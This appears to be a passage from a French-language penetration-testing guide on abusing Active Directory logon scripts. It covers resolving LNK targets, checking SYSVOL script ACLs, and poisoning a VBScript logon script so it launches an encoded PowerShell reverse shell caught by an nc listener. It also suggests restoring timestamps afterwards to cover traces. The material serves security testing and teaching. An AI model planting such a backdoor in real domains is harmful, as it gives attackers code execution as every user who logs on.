- Analyser les fichiers `.lnk` pour résoudre les cibles pointant vers SYSVOL/NETLOGON (astuce DFIR utile pour les attaquants sans accès direct aux GPO) :

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound affiche l’attribut de script de connexion `scriptPath` de l’objet utilisateur lorsqu’il est défini. Les scripts de connexion configurés par GPO constituent une référence de stratégie distincte ; inspectez donc également la GPO applicable.

### Valider l’accès en écriture (ne vous fiez pas aux listes de partages)
Les outils automatisés peuvent indiquer que SYSVOL/NETLOGON est en lecture seule, même si l’ACL NTFS du script concerné est différente. Commencez par inspecter ce fichier et son répertoire parent en lecture seule ; les entrées ACE Allow correspondantes restent des possibilités, car l’accès effectif via SMB et NTFS, les entrées ACE Deny et le jeton actuel comptent tous :

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Un test d’écriture autorisé doit être spécifique à la cible et réversible, avec une sauvegarde du script d’origine qui sera restauré. Ne remplacez pas un script d’ouverture de session fonctionnel simplement pour tester l’accès : une écriture réussie peut s’exécuter lors de la prochaine ouverture de session d’un utilisateur.

### Empoisonner un script d’ouverture de session VBScript pour obtenir une RCE
Ajoutez une commande qui lance un reverse shell PowerShell (générez-le depuis revshells.com) et conservez la logique d’origine pour ne pas perturber les fonctions métier :

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Écoutez sur votre hôte et attendez la prochaine ouverture de session interactive :

```bash
rlwrap -cAr nc -lnvp 443
```

Remarques :
- L’exécution se fait avec le jeton de l’utilisateur de journalisation (pas SYSTEM). La portée correspond au lien GPO (OU, site ou domaine) qui applique ce script.
- Après utilisation, restaurez le contenu et les horodatages d’origine.

## References

- [1] [Abus des ACL/ACE d’Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Comptes privilégiés et privilèges de jeton](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Mise à jour des chemins d’attaque ACL](https://wald0.com/?p=112)
- [4] [Énumération ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Élever ses privilèges avec des ACL dans Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Analyse des privilèges Active Directory et des comptes privilégiés](https://adsecurity.org/?p=3658)
- [7] [Constructeur ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Opérations sur les attributs AD/UAC depuis Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (appartenance à un groupe)](https://www.samba.org/)
- [10] [HTB Puppy : abus des ACL AD, cassage Argon2 de KeePassXC et déchiffrement DPAPI jusqu’à l’administration du DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out : détournement des chemins UNC des GPO pour l’exécution de code et le relais NTLM](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity : exploitation des GPO Active Directory par relais NTLM, et plus encore](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [Une OU qui se moque de vous ? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py : exploitation des vecteurs d’attaque ACL des unités organisationnelles cachées dans Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulation de services Active Directory légitimes sur le réseau : le cas de l’exploitation des GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [GPOddity de Synacktiv](https://github.com/synacktiv/GPOddity)
- [17] [OUned de Synacktiv](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — déplacement entre OU et abus des ACL héritées](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
